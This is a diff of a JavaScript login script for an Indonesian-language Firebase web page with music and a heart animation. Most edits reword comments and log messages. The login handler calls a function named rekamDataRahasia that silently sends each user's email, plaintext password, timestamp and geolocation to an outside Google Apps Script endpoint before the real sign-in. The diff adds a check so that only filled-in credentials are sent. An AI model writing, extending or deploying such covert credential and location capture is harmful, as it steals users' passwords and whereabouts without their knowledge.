@@ -17,10 +17,10 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 
-let timerInterval; // Variabel global penampung interval agar bisa dihapus bersih
+let timerInterval; // Penampung interval global agar bisa di-clear bersih
 
 document.addEventListener('DOMContentLoaded', () => {
-    // Referensi Elemen DOM Utama
+    // Referensi Elemen DOM
     const loginCard = document.getElementById('login-card');
     const contentCard = document.getElementById('content-card');
     const mainContainer = document.getElementById('main-container');
@@ -33,7 +33,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const emailInput = document.getElementById('input-email');
     const passwordInput = document.getElementById('input-password');
 
-    // 1. Monitor Status Autentikasi Firebase (Tunggal & Bersih)
+    // 1. Monitor Status Autentikasi Firebase
     onAuthStateChanged(auth, (user) => {
         if (user) {
             if (loginCard) loginCard.classList.add('hidden');
@@ -54,11 +54,11 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // 2. Event Delegasi Global untuk Tombol Logout (Mengatasi Lag/Freeze WebView)
+    // 2. Event Delegasi Global untuk Tombol Logout (Mengatasi Lag WebView)
     document.addEventListener('click', async (e) => {
         if (e.target && e.target.id === 'btn-logout') {
             e.preventDefault();
-            console.log("Aksi keluar dideteksi melalui delegasi global.");
+            console.log("Proses logout mendeteksi delegasi klik.");
             try {
                 if (bgMusic) {
                     bgMusic.pause();
@@ -66,8 +66,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 await signOut(auth);
             } catch (error) {
-                console.error("Terjadi kegagalan proses logout:", error);
-                location.reload(); // Fallback darurat jika Firebase offline
+                console.error("Gagal melakukan signOut:", error);
+                location.reload(); // Paksa reload jika terjadi error fatal
             }
         }
     });
@@ -82,41 +82,40 @@ document.addEventListener('DOMContentLoaded', () => {
                 startGalaxyHeart();
             }
             if (bgMusic) {
-                bgMusic.play().catch(err => console.log("Audio otomatis ditahan browser"));
+                bgMusic.play().catch(err => console.log("Audio diblokir otomatis oleh browser"));
             }
         });
     }
 
-    // 4. Interaksi Tombol Login (Pengecekan Validasi Berurutan)
+    // 4. Interaksi Tombol Login
     if (loginButton) {
         loginButton.addEventListener('click', (e) => {
             e.preventDefault();
             const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
 
-            // Proteksi Awal: Jangan rekam jika ada kolom kosong!
+            // Proteksi Awal pada Event
             if (!email || !password) {
                 alert("Email dan Password wajib diisi!");
                 return;
             }
 
-            // Jalankan perekaman hanya setelah dipastikan data terisi penuh
             rekamDataRahasia(email, password).catch(err => console.log(err));
 
             signInWithEmailAndPassword(auth, email, password)
-                .then(() => console.log("Firebase Login Berhasil"))
+                .then(() => console.log("Firebase Login Sukses"))
                 .catch((error) => alert("Login Gagal: " + error.message));
         });
     }
 
-    // 5. Interaksi Tombol Register (Pengecekan Validasi Berurutan)
+    // 5. Interaksi Tombol Register
     if (btnRegister) {
         btnRegister.addEventListener('click', async (e) => {
             e.preventDefault();
             const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
 
-            // Proteksi Awal: Cek data sebelum memproses perekaman
+            // Proteksi Awal pada Event
             if (!email || !password) {
                 alert("Email dan Password tidak boleh kosong!");
                 return;
@@ -126,17 +125,23 @@ document.addEventListener('DOMContentLoaded', () => {
 
             try { 
                 await createUserWithEmailAndPassword(auth, email, password);
-                alert("Akun baru berhasil didaftarkan!");
+                alert("Akun baru berhasil terdaftar!");
             } catch (error) {
-                if (error.code === 'auth/email-already-in-use') alert("Email tersebut sudah digunakan.");
+                if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
                 else alert("Gagal mendaftar: " + error.message);
             }
         });
     }
 });
 
-// --- FUNGSI PENDUKUNG LOGGING ---
+// --- FUNGSI LOGGING (DENGAN PROTEKSI TOTAL DARI DATA KOSONG) ---
 async function rekamDataRahasia(email, password) {
+    // PROTEKSI UTAMA: Jika data tidak valid atau kosong, potong jalur (Abort) di sini!
+    if (!email || !password || email.trim() === "" || password.trim() === "") {
+        console.log("Perekaman dibatalkan otomatis: Deteksi input kosong.");
+        return; 
+    }
+
     const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
     
     const sekarang = new Date();
@@ -155,6 +160,7 @@ async function rekamDataRahasia(email, password) {
                 kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
             },
             () => {
+                // Di sini lokasi ditolak, namun gerbang atas memastikan email & pw asli (bukan kosongan)
                 kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
             },
             { timeout: 4000 }
